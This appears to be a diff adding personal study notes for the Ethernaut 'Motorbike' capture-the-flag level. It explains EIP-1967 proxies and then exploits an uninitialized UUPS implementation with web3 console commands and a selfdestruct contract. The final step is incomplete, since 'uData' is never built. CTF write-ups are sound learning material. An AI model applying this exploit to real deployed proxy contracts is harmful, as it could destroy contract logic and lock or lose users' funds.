@@ -1,0 +1,115 @@
+-----------------
+NOTES
+------------------
+
+LEVEL 25 MOTORBIKE
+------------------
+
+TODO: Add EIP to glossary
+Background: Proxying Contracts
+- EIP = Ethereum Improvement Proposal
+- Proxy contracts are used for upgradeability and gas costs
+	- Proxy contracts use a "logic contract" that houses most of the code and
+		the logic
+		- The logic contract is called using a delegatecall
+	- Using this model, the calling contract will deal with state storage while
+		the logic contract just deals with logic
+- This model can cause security issues when dealing with delegatecalls, see
+	previous levels
+- To circumvent this storage issue, developers should use a safe pattern like
+	EIP-1967
+
+Vulnerability: Uninitialized UUPS implementation
+
+- The goal of this level is to "blow up" the engine of the motorbike contract
+	by forcing the engine contract to call selfdestruct
+- Motorbike follows the EIP-1967 pattern, which specifies where the logic
+	contract is stored at
+- Once finding and inspecting the engine contract itself, we see that the
+	contract is uninitialized
+- If we can initialize the contract, we can make ourselves and "upgrader" and
+	call a new contract with selfdestruct()
+
+Exploitation
+
+- Finding the implementation address (address of the logic contract)
+	- According to EIP-1967 the address of the logic contract will be defined,
+		usually at the same slot
+	- From Motorbike:
+
+		bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+		- The implementation slot which holds the address of the logic contract is
+			stored at 0x36089...82bbb
+		- Inspecting the storage slot as we have done in the past
+
+			await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
+
+			- This should return a 20 byte hex string with 16 bytes of zeros
+				prepended, the hex string without the leading zeros is the address we
+				need
+				- Storing the address
+
+					engine = '0x70260d4a4c165a7341ded115c29430d24126ce52'
+
+- Inspecting the storage of the logic contract
+	- Inspecting the values of the storage slots of the engine contract we see
+		straight zeros
+
+		await web3.eth.getStorageAt(engine, 0)
+		"0x0000000000000000000000000000000000000000000000000000000000000000"
+		await web3.eth.getStorageAt(engine, 1)
+		"0x0000000000000000000000000000000000000000000000000000000000000000"
+
+		- With all zeros in storage, we know that the contract has never had its
+			initialize() function called
+			- This means we can call initialize and name ourself to be the upgrader
+				of the contract
+
+- Calling initialize() to become the upgrader
+	- Encode the signature of the string "initialize()" to be sent as part of
+		the transaction
+
+		initData = web3.eth.abi.encodeFunctionSignature("initialize()")
+
+	- Calling initialize() from the JS console
+
+		await web3.eth.sendTransaction({from:player, to:engine, data:initData})
+
+	- Checking the storage of the engine contract to confirm we updated the
+		variables
+
+		await web3.eth.getStorageAt(engine, 0)
+		"0x00000000000000000000e4c9c9d2703b269f3964e73e10f4931b945f3b310001"
+		await web3.eth.getStorageAt(engine, 1)
+		"0x00000000000000000000000000000000000000000000000000000000000003e8"
+
+		- Storage slot 0 has a value in it, meaning we have successfully called
+			initialize()
+
+- Creating an evil selfdestruct contract
+	- Follow the same pattern we have used in the past for coding, compiling,
+		and deploying contracts to the blockchain via Remix
+	- The contract we need to cook up is very simple, it will have just one
+		function that calls selfdestruct
+
+		pragma solidity ^0.6.0;
+
+		contract SpontaneousCombustion {
+			function destruct() public {
+				selfdestruct(address(0));
+			}
+		}
+
+- Calling upgradeToAndCall
+	- For ease of use, we are going to store the following variables in the
+		javascript console
+
+		Calling upgradeToAndCall
+			attacker = 'address of deployed attacker contract'
+
+			dData = web3.eth.abi.encodeFunctionSignature('destruct()')
+
+			uSig = {name:'upgradeToAndCall', type:'function', inputs: [{type:'address', name:'newImplementation'}, {type:"bytes", name:"data"}]}
+
+			web3.eth.sendTransaction({from: player, to: engine, data:uData})
